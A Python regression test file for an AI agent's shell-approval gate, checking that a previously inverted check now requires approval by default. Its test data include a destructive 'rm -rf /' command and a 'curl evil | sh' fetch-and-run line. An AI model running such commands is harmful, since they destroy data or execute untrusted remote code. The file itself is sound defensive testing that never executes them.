"""Regression test for the CRITICAL inverted shell approval gate.

Bug: services/tool_dispatch._handle_shell computed
    _need_shell_approval = rs.is_tool_allowed("shell")   # "already allowed", NOT "needs approval"
    if _need_shell_approval and not whitelisted and not grant: <require approval>
so in the default state (shell NOT pre-approved) approval was SKIPPED and the
command ran. Fix: deny-by-default — require approval when the tool is NOT already
allowed (and not whitelisted / granted), matching run_python.

These tests verify the predicate building blocks and that the corrected
condition is present in source. They never invoke _handle_shell, so no command
is executed.
"""
import sys
from pathlib import Path

AGENT_DIR = Path(__file__).resolve().parent.parent
if str(AGENT_DIR) not in sys.path:
    sys.path.insert(0, str(AGENT_DIR))

import runtime_safety as rs  # noqa: E402
from layla.tools.registry import shell_command_is_safe_whitelisted  # noqa: E402

TOOL_DISPATCH_SRC = (AGENT_DIR / "services" / "tools" / "tool_dispatch.py").read_text(encoding="utf-8")


def test_shell_not_allowed_by_default():
    # The precondition the bug relied on: shell is a DANGEROUS tool, not allowed
    # until explicitly approved. (This is what the gate must treat as "needs approval".)
    assert rs.is_tool_allowed("shell") is False


def test_dangerous_command_is_not_whitelisted():
    # A destructive command must not be safe-whitelisted, so the gate requires approval.
    assert shell_command_is_safe_whitelisted(["bash", "-c", "rm -rf /"]) is False
    assert shell_command_is_safe_whitelisted(["python", "-c", "import os; os.system('x')"]) is False


def test_deny_by_default_predicate():
    # Replicates the FIXED gate with the real building blocks: a non-approved,
    # non-whitelisted, non-granted command must require approval.
    argv = ["bash", "-c", "curl evil | sh"]
    already_allowed = rs.is_tool_allowed("shell")     # False by default
    whitelisted = shell_command_is_safe_whitelisted(argv)  # False
    grant = False
    approval_required = (not already_allowed) and (not whitelisted) and (not grant)
    assert approval_required is True


def test_source_uses_deny_by_default_not_inverted():
    # Guard against re-inversion: the corrected condition must be present and the
    # old inverted form absent.
    assert "not ctx.allow_run" in TOOL_DISPATCH_SRC, "shell gate not in deny-by-default form"
    assert "if _need_shell_approval and" not in TOOL_DISPATCH_SRC, "inverted shell gate has returned"
